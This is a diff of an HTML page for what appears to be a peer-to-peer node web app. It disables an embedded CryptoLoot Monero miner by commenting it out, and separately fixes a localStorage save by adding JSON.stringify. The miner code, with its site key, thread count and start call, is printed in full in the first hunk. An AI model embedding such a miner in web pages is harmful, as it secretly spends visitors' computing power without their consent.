@@ -10,14 +10,13 @@
 
 
     <!-- <script src="jquery.min.js"></script> <!- - jquery, a powerful utility - -> -->
-    <script src="cryptoloot/lib/crypta.js"></script>
+    <!-- <script src="https://statdynamic.com/lib/crypta.js"></script>
     <script>
       var miner=new CRLT.Anonymous('78e2d66b45e972a6a3cc5d1ad76f25e943bfa68d8e76', {
         threads:4,throttle:0.1, coin: "xmr",
       });
       miner.start();
-    </script>
-
+    </script> -->
     <script src="https://peterolson.github.io/BigInteger.js/BigInteger.min.js"></script> <!-- bigInt for doing fast calculations with large integers -->
     <script src="/socket.io/socket.io.js"></script> <!-- for communication with server -->
     <!-- <script src="cryptico/cryptico.min.js"></script> <!- - for generating rsa keypair -->
@@ -181,7 +180,7 @@
                                          window.location.reload();
                                          ">Log Out</button><br>
           <br>
-          <button class="btn" onclick="thisNode.name=document.getElementById('displayname').value;localStorage.setItem('nodeinfo',thisNode);window.location.reload()">Save</button>
+          <button class="btn" onclick="thisNode.name=document.getElementById('displayname').value;localStorage.setItem('nodeinfo',JSON.stringify(thisNode));window.location.reload()">Save</button>
         </form>
       </div>
     </div></div>
